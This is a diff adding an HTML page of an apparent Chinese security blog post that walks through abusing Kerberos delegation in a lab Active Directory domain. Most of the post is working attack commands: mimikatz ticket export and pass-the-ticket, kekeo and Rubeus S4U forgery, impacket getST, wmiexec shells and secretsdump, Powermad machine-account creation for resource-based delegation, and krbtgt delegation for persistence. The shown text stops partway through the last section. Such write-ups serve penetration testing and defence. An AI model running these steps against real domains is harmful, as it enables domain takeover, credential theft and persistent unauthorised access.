@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:lzz]">
+<meta name="description" content="委派利用小结" />
+<meta name="keywords" content="homepage, blog, science, informatics, development, programming, AD" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/" />
+
+
+    <title>
+        
+            委派利用面 :: lzzzzzzz 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://lzzbb.github.io/main.2461b42f711aae674dd78e353275891fa072d7bf2ea9fbd577297a99dde78461.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://lzzbb.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://lzzbb.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://lzzbb.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://lzzbb.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://lzzbb.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://lzzbb.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="委派利用面">
+<meta itemprop="description" content="委派利用小结"><meta itemprop="datePublished" content="2021-04-23T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-04-23T00:00:00+00:00" />
+<meta itemprop="wordCount" content="979"><meta itemprop="image" content="https://lzzbb.github.io/"/>
+<meta itemprop="keywords" content="AD," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lzzbb.github.io/"/>
+
+<meta name="twitter:title" content="委派利用面"/>
+<meta name="twitter:description" content="委派利用小结"/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-04-23 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://lzzbb.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://lzzbb.github.io/posts">Posts</a></li><li><a href="https://lzzbb.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/">委派利用面</a>
+      </h1>
+
+      
+        <div class="post-excerpt">委派利用小结</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h1 id="委派概述">委派概述：</h1>
+<p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
+<p><strong>简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</strong></p>
+<h2 id="委派的方式">委派的方式：</h2>
+<p><strong>非约束委派和约束委派，基于资源的约束委派。</strong></p>
+<p><strong>在域内只有主机账号和服务账号才有委派属性</strong></p>
+<p>主机账号：活动目录中的computers组内的计算机，也被称为机器账号。</p>
+<p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p>
+<h2 id="委派的前提">委派的前提：</h2>
+<p>被委派的用户不能被设置为不能被委派属性。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/1.png" alt="image"></p>
+<h2 id="查找非约束委派的主机或服务账号域控默认配置非约束委派属性">查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）：</h2>
+<h3 id="1利用powersploit中的powerview">1.利用powersploit中的powerview</h3>
+<p>Import-Module .\PowerView.ps1;</p>
+<p>查询非约束委派的主机
+Get-NetComputer -Unconstrained -Domain hiro.com</p>
+<p>查询非约束委派的服务账号
+Get-NetUser -Unconstrained -Domain hiro.com | select name</p>
+<h3 id="2利用adfind">2.利用ADFind</h3>
+<p>查找域中配置非约束委派的用户
+AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&rdquo; cn distinguishedName</p>
+<p>查找域中配置非约束委派的主机
+AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&rdquo; cn distinguishedName</p>
+<h2 id="查找约束委派的主机或服务账号">查找约束委派的主机或服务账号：</h2>
+<h3 id="1利用empire中的powerview">1.利用empire中的powerview</h3>
+<p>Import-Module .\powerview.ps1;</p>
+<p>查询约束委派的主机：
+Get-DomainComputer -TrustedToAuth -Domain hiro.com | select name</p>
+<p>查询约束委派的账号：
+Get-DomainUser -TrustedToAuth -Domain hiro.com | select name</p>
+<h3 id="2利用adfind-1">2.利用ADFind</h3>
+<p>查找域中配置约束委派用户:
+AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&rdquo; cn distinguishedName msds-allowedtodelegateto</p>
+<p>查找域中配置约束委派的主机：
+AdFind.exe -b &ldquo;DC=hiro,DC=com&rdquo; -f &ldquo;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&rdquo; cn distinguishedName msds-allowedtodelegateto</p>
+<hr>
+<h2 id="非约束委派">非约束委派</h2>
+<h3 id="大致流程"><strong>大致流程：</strong></h3>
+<p>user访问serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，如果是非约束委派的话，会把用户的<strong>TGT放在ST票据中并一起发送给serverA</strong>
+这样serverA在验证ST票据的同时也获取到了用户的TGT，并<strong>把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来模拟这个user访问任何服务。</strong>
+<img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/2.png" alt="image"></p>
+<p>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境。</p>
+<h3 id="利用">利用：</h3>
+<pre tabindex="0"><code>域：hiro.com
+域控：WIN-KONG IP：192.168.228.10  域管：administrator
+受委派机器：WIN-E6FR4HVBPCI
+</code></pre><p>现在将WIN-E6FR4HVBPCI这个机器账号设置为非约束委派。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/3.png" alt="image"></p>
+<p>通过命令行打开adsiedit.msc查看WIN-E6FR4HVBPCI机器属性，可以看到：</p>
+<p>当被设置为非约束委派的时候，它的userAccountControl会包含TRUSTED_FOR_DELEGATION字段。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/4.png" alt="image"></p>
+<p>用域管访问WIN-E6FR4HVBPCI机器</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/5.png" alt="image"></p>
+<p>然后在WIN-E6FR4HVBPCI上以管理员权限运行mimikatz</p>
+<p><code>privilege::debug</code></p>
+<p>导出票据</p>
+<p><code>sekurlsa::tickets /export</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/6.png" alt="image"></p>
+<p>此时拿到了管理员的票据，用mimikatz将票据注入内存中，然后访问域控</p>
+<p>导入票据</p>
+<p><code>kerberos::ptt xxxxxxxxAdministrator@krbtgt-HIRO.COM.kirbi</code></p>
+<p>查看票据</p>
+<p><code>kerberos::list</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/7.png" alt="image"></p>
+<h4 id="非约束委派spooler打印机">非约束委派+spooler打印机</h4>
+<p>费约束委派常规利用感觉还是比较鸡肋，想得到域内权限必须要管理员与配置了委派的机器建立连接，所以有国外的大佬研究出了非约束委派+spooler打印机来强制与指定的主机进行连接。
+开始域控为server2012，后面网上有的大佬说可能是版本的问题，后面升级到了server2016还是报错，这种情况复现不了了，有兴趣的可以自己试一试。<a href="https://blog.csdn.net/a3320315/article/details/106511098" title="也可以参考这篇文章">也可以参考这篇文章</a>。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/8.png" alt="image"></p>
+<hr>
+<h2 id="约束委派">约束委派</h2>
+<p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U，其中S4U支持两个子协议：Service for User to Self (<code>S4U2Self</code>)和 Service for User to Proxy (S4U2proxy)，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self可以代表自身请求针对其自身的可转发的Kerberos服务票据(ST1)</code>；<code>S4U2proxy可以以用户的名义请求其它服务的ST2</code>，约束委派就是限制了S4U2proxy扩展的范围.</p>
+<p>其中：</p>
+<p><code>S4U2Self</code>（用用户的TGT向KDC请求用户的可转发的ST1，再用这张ST1去发起S4U2proxy请求。）
+通过此扩展可以拿到一张标识任意用户身份的ST，它的作用其实是<code>协议转换</code>。有时用户会通过<code>其他协议</code>（例如NTLM或什至基于表单的身份验证）对服务进行身份验证，因此他们不会将TGS发送给服务。在这种情况下，服务可以<code>调用S4U2Self来要求身份验证服务为其自身的任意用户生成TGS</code>，然后可以在调用S4U2Proxy时将其用作依据。例如网站A服务器可以使用它去向KDC请求一张用户B身份的ST1，网站A服务器再用这张ST1去发起S4U2proxy请求。</p>
+<p><code>S4U2proxy</code>（<strong>拿用户的可转发的ST1请求用于访问服务器的ST2</strong>）
+该拓展作用是使用一张用户A身份的ST1去向KDC请求一张用于访问文件服务器B的ST2，这张ST2的身份还是用户的，这样的话网站A就可以利用用户A的权限去访问文件服务器B上的文件了。</p>
+<h3 id="大致流程-1">大致流程：</h3>
+<p>user访问serviceA，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对serviceA进行访问</p>
+<p>如果配置了serviceA到serviceB的约束委派，则serviceA能<strong>使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给DC。</strong></p>
+<p>域控返回serviceA一个用来访问serviceB的ST2票据,这样serviceA就能以用户的身份对serviceB发起访问。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/9.png" alt="image"></p>
+<p>由于服务用户<code>只能获取某个用户（或主机）的服务的ST1而非TGT</code>，<code>所以只能模拟用户访问特定的服务</code>，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以<code>伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2</code>。</p>
+<h3 id="利用-1">利用：</h3>
+<pre tabindex="0"><code>域：hiro.com
+域控:WIN-KONG@192.168.228.10  域管：administrator
+受委派机器：WIN-RRI9T9SN85D@192.168.228.15 域用户：win7
+</code></pre><p>首先在域控上将域用户win7注册成为SPN服务账号</p>
+<p><code>setspn -S cifs/WIN-RRI9T9SN85D.hiro.com win7</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/10.png" alt="image"></p>
+<p>查看是否注册成功</p>
+<p><code>setspn -L win7</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/11.png" alt="image"></p>
+<p>然后将win7用户设置约束委派的属性，为访问域控的cifs（<code>访问文件夹</code>）</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/12.png" alt="image"></p>
+<p>通过命令行打开adsiedit.msc查看win7用户属性，可以看到：</p>
+<p><strong>当被设置为约束委派的时候，它的userAccountControl会包含TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION字段。</strong></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/13.png" alt="image"></p>
+<p>并且比非约束委派的账户多了msDS-AllowedToDelegateTo字段，里面包含了允许委派的服务.</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/14.png" alt="image"></p>
+<p>当知道win7这个服务用户的明文密码或者Hash时，可以用kekeo请求它的TGT</p>
+<p>拥有明文密码</p>
+<p><code>tgt::ask /user:win7 /domain:hiro.com /password:123456QWE. </code></p>
+<p>拥有账户的Hash</p>
+<p><code>tgt::ask /user:win7 /domain:hiro.com /NTLM:xxxx</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/15.png" alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/16.png" alt="image"></p>
+<p>PS:如果既不知道明文也不知道Hash，如果有了服务用户登录的主机权限，可以用mimikatz从内存中把服务用户的TGT dump下来照样可以实现</p>
+<p>从内存中导出所有票据</p>
+<p><code>sekurlsa::tickets /export</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/17.png" alt="image"></p>
+<p>然后通过win7的TGT伪造s4u请求以administrator身份请求访问WIN-KONG cifs的ST</p>
+<p><code>tgs::s4u /tgt:TGT_win7@HIRO.COM_krbtgt~hiro.com@HIRO.COM.kirbi /user:Administrator@hiro.com /service:cifs/WIN-KONG.hiro.com</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/%2018.png" alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/19.png" alt="image"></p>
+<p>用mimikatz将票据导入内存中</p>
+<p><code>kerberos::ptt TGS_Administrator@hiro.com@HIRO.COM_cifs~WIN-KONG.hiro.com@HIRO.COM.kirbi</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/20.png" alt="image"></p>
+<p>访问域控：</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/21.png" alt="image"></p>
+<hr>
+<h2 id="约束委派请求过程">约束委派请求过程：</h2>
+<p><code>tgt::ask /user:win7 /domain:hiro.com /password:123456QWE. </code></p>
+<h3 id="as-req"><strong>AS-REQ</strong></h3>
+<p>以用户win7请求TGT</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/22.png" alt="image"></p>
+<h3 id="as-rep"><strong>AS-REP</strong></h3>
+<p>AS返回用户win7的TGT，也就是得到了</p>
+<p><code>TGT_win7@HIRO.COM_krbtgt~hiro.com@HIRO.COM.kirbi</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/23.png" alt="image"></p>
+<p><code>tgs::s4u /tgt:TGT_win7@HIRO.COM_krbtgt~hiro.com@HIRO.COM.kirbi /user:Administrator@hiro.com /service:cifs/WIN-KONG.hiro.com</code></p>
+<h3 id="tgs-req"><strong>TGS-REQ</strong></h3>
+<p>win7用户用上一步得到的TGT，用上S4U2Self协议，以administrator的名义向TGS申请一张访问自身服务并且可转发的ST1票据。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/24.png" alt="image"></p>
+<h3 id="tgs-rep"><strong>TGS-REP</strong></h3>
+<p>TGS返回administrator的ST1票据给win7</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/25.png" alt="image"></p>
+<h3 id="tgs-req-1"><strong>TGS-REQ</strong></h3>
+<p>win7用户拿到了administrator的ST1票据后，win7带上这张<strong>可转发</strong>的访问自身服务的票据，用上S4U2Proxy协议，<strong>以administrator用户的名义请求一张访问WIN-KONG的CIFS服务的ST2票据</strong></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/26.png" alt="image"></p>
+<h3 id="tgs-rep-1"><strong>TGS-REP</strong></h3>
+<p>TGS返回以administrator用户访问WIN-KONG的CIFS服务的票据，也就是得到了<code>TGS_Administrator@hiro.com@HIRO.COM_cifs~WIN-KONG.hiro.com@HIRO.COM.kirbi</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/27.png" alt="image"></p>
+<p>通过流程可以看出，<strong>第一步生成的可转发的ST1只是为了请求第二步以administrator用的名义请求一张访问WIN-KONG的CIFS服务的ST2票据</strong>。</p>
+<hr>
+<h3 id="利用约束委派权限维持"><strong>利用约束委派权限维持</strong></h3>
+<p><strong>通过约束委派生成黄金票据</strong></p>
+<p><code>TGT由krbtgt Hash加密，如果能通过委派krbtgt服务，那么就能伪造任意用户的TGT了。</code></p>
+<p>由于krbtgt默认是禁用的，所以无法使用页面添加它的SPN。</p>
+<p><strong>域控通过powershell添加win7到krbtgt的约束委派：</strong></p>
+<pre tabindex="0"><code>
+powershell -exec bypass
+
+Import-Module ActiveDirectory
+
+$user = Get-ADUser win7  （win7为设置为约束委派的服务账号）
+
+Set-ADObject $user -Add @{ &#34;msDS-AllowedToDelegateTo&#34; = @(&#34;krbtgt/hiro.com&#34;) }
+</code></pre><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/28.png" alt="image"></p>
+<p><strong>利用impacket套件攻击</strong></p>
+<p>伪造administrator的TGT</p>
+<p><code>python3 getST.py -dc-ip 192.168.228.10 -spn krbtgt/hiro.com -impersonate administrator hiro.com/win7:123456QWE.</code></p>
+<p>导入票据</p>
+<p><code>export KRB5CCNAME=administrator.ccache</code></p>
+<p>用wmiexec弹出一个权限为administrator交互式的shell</p>
+<p><code>python3 wmiexec.py -no-pass -k administrator@WIN-KONG.hiro.com -dc-ip 192.168.228.10</code></p>
+<p>导出域内哈希</p>
+<p><code>python3 secretsdump.py -no-pass -k WIN-KONG.hiro.com</code></p>
+<hr>
+<h2 id="基于资源的约束委派"><strong>基于资源的约束委派</strong></h2>
+<p>传统的委派，在设置的过程中其实都是需要SeEnableDelegation特权，而这个特权需要域管理员才能设置。<strong>相对于传统的委派，基于资源的约束委派它不需要域管理员设置，而是机器本身。</strong></p>
+<h3 id="约束委派和基于资源的约束委派的区别">约束委派和基于资源的约束委派的区别：</h3>
+<p>前者：<code>通过服务A委派到服务B</code>，实际是在服务A上增加<strong>TRUSTED_FOR_DELEGATION</strong>字段（<code>非约束委派</code>），<strong>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</strong>和<strong>msDS-AllowedToDelegateTo</strong> （<code>约束委派</code>）字段来达到委派的目的。</p>
+<p>后者：<code>通过服务B允许服务A委派到服务B</code>，实际是通过服务B自身赋予<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>字段，从而允许服务A对服务B的基于资源的约束委派。</p>
+<p>所以当利用到基于资源的约束委派的时候，<code>服务A的两个字段是没有赋值的</code>，<strong>当这两个字段没有被赋值的时候，通过S4U2Self得到的ST服务票证是<code>不可被转发</code>的</strong>，<strong>而S4U2Proxy的作用就是<code>将可转发的ST票据转发到其他服务</code>进行委派认证</strong>。<strong>但是</strong>：<strong>在基于资源的约束委派过程中</strong>，<strong>不可转发的ST仍可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后还会返回一张可转发的ST服务票证</strong>。</p>
+<p>因此，如果能够在服务B上配置允许服务A的基于资源的约束委派，那么就可以通过控制服务A使用S4U2Self向域控请求任意用户访问自身的服务票据，最后再使用S4U2Proxy转发此ST1票据去请求访问服务B的可转发的ST2服务票据，就可以模拟任意用户访问服务B了。这里可以以普通域用户的身份去创建机器账号作为服务A。</p>
+<h3 id="条件">条件</h3>
+<p><strong>利用基于资源的约束委派(RBCD)需要2个条件：</strong></p>
+<p><strong>1.拥有将域机器加入域的域用户的权限</strong>。（将机器B加入域的域用户拥有修改机器B的msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限。）</p>
+<p><strong>2.一个任意服务账户或者一个机器账户</strong>（每一个域用户默认可以添加10个机器账户，可以通过LDAP中的MAQ属性查看）</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/29.png" alt=""></p>
+<h3 id="利用-2">利用：</h3>
+<p>域：hiro.com
+域控：WIN-KONG@192.168.228.10 域管：administrator
+域内机器：DESKTOP-P34E60A，win10把这台机器加入到域内</p>
+<p><strong>通过ADFind查找将域机器拉入域的用户的SID：</strong></p>
+<p><code>AdFind.exe -b &quot;DC=hiro,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369))&quot; cn mS-DS-CreatorSID</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/30.png" alt="image"></p>
+<p><strong>查看S-1-5-21-3105699010-1460039537-418241315-1118是谁：</strong></p>
+<p><code>AdFind.exe -b &quot;DC=hiro,DC=com&quot; -f &quot;(&amp;(objectsid=S-1-5-21-3105699010-1460039537-418241315-1118))&quot; objectclass cn dn</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/31.png" alt="image"></p>
+<p>假如现在已经拿到了把DESKTOP-P34E60A这台机器加入域的用户win10的权限</p>
+<p>使用whoami /all查询当前用户的sid</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/32.png" alt="image"></p>
+<p>同样可以通过用户的sid查看哪些域机器是通过自己加入到域内的：</p>
+<p><code>AdFind.exe -b &quot;DC=hiro,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(mS-DS-CreatorSID=S-1-5-21-3105699010-1460039537-418241315-1118))&quot; cn sAMAccountType objectCategory</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/33.png" alt="image"></p>
+<p><code>如果一个机器账号没有mS-DS-CreatorSID，那么他是被域管拉入到域内的</code></p>
+<p>利用powermad添加机器账户：(<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a>)</p>
+<p><code>Import-Module .\Powermad.ps1</code></p>
+<p><strong>以win10用户创建一个域机器名为win10system，密码为win10</strong></p>
+<p><code>New-MachineAccount -MachineAccount win10system -Password $(ConvertTo-SecureString &quot;win10&quot; -AsPlainText -Force)</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/34.png" alt="image"></p>
+<p><strong>验证是否创建成功：</strong></p>
+<p><code>net group &quot;domain computers&quot; /do</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/35.png" alt="image"></p>
+<p><strong>查询添加机器的SID：</strong></p>
+<p>1.域控上查询：</p>
+<p><code>dsquery computer | dsget computer -dn -sid</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/36.png" alt="image"></p>
+<p>或者powershell运行Get-ADComputer win10system</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/37.png" alt="image"></p>
+<p>2.域机器上查询：（使用empire下的powerview）</p>
+<pre tabindex="0"><code>Import-Module .\powerview.ps1
+
+Get-DomainComputer -Identity win10system
+</code></pre><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/38.png" alt="image"></p>
+<p>win10用户设置win10system到DESKTOP-P34E60A的基于资源的约束委派（使用empire下的powerview）</p>
+<pre tabindex="0"><code>
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3105699010-1460039537-418241315-1151)&#34;
+
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+
+$SD.GetBinaryForm($SDBytes, 0)
+
+Get-DomainComputer DESKTOP-P34E60A| Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
+</code></pre><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/39.png" alt="image"></p>
+<p>检查是否配置成功</p>
+<p><code>Get-DomainComputer DESKTOP-P34E60A -Properties msds-allowedtoactonbehalfofotheridentity</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/40.png" alt="image"></p>
+<p>攻击完成清除基于资源的约束委派配置：</p>
+<p><code>Set-DomainObject DESKTOP-P34E60A -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</code></p>
+<p>也可以在域控上通过命令行打开adsiedit.msc查看CN=DESKTOP-P34E60A机器属性，可以看到：</p>
+<p><code>当被设置为基于资源的约束委派的时候，它的msds-allowedtoactonbehalfofotheridentity会包含有效字段。</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/41.png" alt="image"></p>
+<p>现在已经配置好利用条件就可以通过基于资源的约束委派进行攻击了</p>
+<p><strong>1.使用rubues获取票据</strong></p>
+<p><code>Rubeus.exe hash /user:win10system /password:win10 /domain:hiro.com</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/42.png" alt="image"></p>
+<p><code>Rubeus.exe s4u /user:win10system$ /rc4:6C4FD556DB12BE51BACD9A3CC19D486E /impersonateuser:administrator /msdsspn:cifs/DESKTOP-P34E60A /ptt</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/43.png" alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/44.png" alt="image"></p>
+<p><strong>2.使用impacket套件获取</strong></p>
+<pre tabindex="0"><code>
+python3 getST.py -dc-ip 192.168.228.10 -spn cifs/DESKTOP-P34E60A -impersonate administrator hiro.com/win10system$:win10
+
+set KRB5CCNAME=administrator.ccache
+
+python3 wmiexec.py -no-pass -k administrator@DESKTOP-P34E60A.hiro.com -dc-ip 192.168.228.10
+</code></pre><h3 id="利用基于资源的约束委派进行权限维持">利用基于资源的约束委派进行权限维持</h3>
+<p>跟约束委派利用相似，可以配置win10system到krbtgt的基于资源的约束委派，只要有了win10system的权限，就能伪造任意用户请求krbtgt服务，则可以请求到任意用户的TGT.</p>
+<p>在域控上执行：</p>
+<pre tabindex="0"><code>
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3105699010-1460039537-418241315-1151)&#34;
+
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+
+$SD.GetBinaryForm($SDBytes, 0)
+
+Set-DomainObject krbtgt -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
+</code></pre><p>可以看到brbtgt的msds-allowedtoactonbehalfofotheridentity会包含有效字段。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/45.png" alt="image"></p>
+<p><strong>1.使用rubeus伪造administrator请求TGT</strong></p>
